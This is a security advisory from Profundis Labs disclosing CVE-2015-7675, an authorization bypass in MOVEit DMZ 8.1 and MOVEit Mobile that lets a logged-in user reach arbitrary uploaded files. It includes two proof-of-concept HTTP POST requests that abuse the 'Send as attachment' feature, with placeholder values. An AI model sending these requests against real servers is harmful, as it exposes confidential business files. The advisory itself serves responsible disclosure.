Profundis Labs - Security Advisory

Vulnerablity Title
==================
A security issue in MOVEit web and mobile application allows for unauthorized access to arbitrary files and documents

Vendor:
=======
Ipswitch, Inc (http://www.ipswitchft.com) 

Product:
========
MOVEit File Transfer

MOVEit is an automated file transfer system that lets you manage, view, secure, and control all business-critical file transfer activity through a single, secure system.
(Source: http://www.ipswitchft.com/moveit-managed-file-transfer)

Affected Versions:
==================
MOVEit DMZ v8.1 and below

Vulnerability Type:
===================
Authorization Bypass

CVE Reference:
==============
CVE-2015-7675

VENDOR Reference:
=================
http://docs.ipswitch.com/MOVEit/DMZ82/ReleaseNotes/MOVEitReleaseNotes82.pdf
Vendor Reference Number: MIDMZ-6575

Vulnerability Details:
======================
It is possible to gain access to arbitrary uploaded files/documents by abusing the feature "Send as attachment".

To exploit this vulnerability, the following information is needed:
- A valid user account (user session)
- A valid FileID
  FileIDs can be obtained by vulnerability CVE-2015-7677 (https://profundis-labs.com/advisories/CVE-2015-7677.txt)

PoC code(s):
============
Mobile Application:

POST /mobile/sendMsg?1441957507... HTTP/1.1
Host: <FQDN>:8443
...

id=&subject=trdt&body=test&toEmailList=<EMAILADRESS>&ccEmailList=&bccEmailList=&isNew=1&messageType=7&serverFileIds=<FILEID>&noReplyAll=0&deliveryReceipt=0&secureBody=true&maxAttachDownloads=5&expireAfterHours=240

Web application:

POST /human.aspx?r=1083532... HTTP/1.1
Host: <FQDN>
...

csrftoken=fd31...&transaction=folderfilelistattach&confirm=1&arg01=<FILEID>&arg02=2178...&arg03=&arg04=&arg05=&arg06=2178...&arg07=&arg08=&arg09=&arg10=&arg11=&arg12=filelist

Remark: Values in Brakets are placeholders.
  
Disclosure Timeline:
====================
Vendor Notification:  09/23/2015
Vendor Confirmation:  09/24/2015
Vendor Patch Release: 10/20/2015 
Public Disclosure:    01/27/2016

Severity Level:
===============
6.5 (Medium) 
CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

Description:
============
Request Method(s):              [+]  HTTP POST

Vulnerable Product:             [+]  MOVEit DMZ v8.1
                                     MOVEit Mobile (v1.2.0.962)

Vulnerable Parameter(s):        [+]  FILEID 

Authentication (Role):          [+]  User, Guest Access

===========================================================
[+] Author: Philipp Rocholl

[+] Website: https://www.profundis-labs.com

[+] Source:  https://profundis-labs.com/advisories/CVE-2015-7675.txt

[+] Disclaimer
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. 
Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author.
The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of security related information.

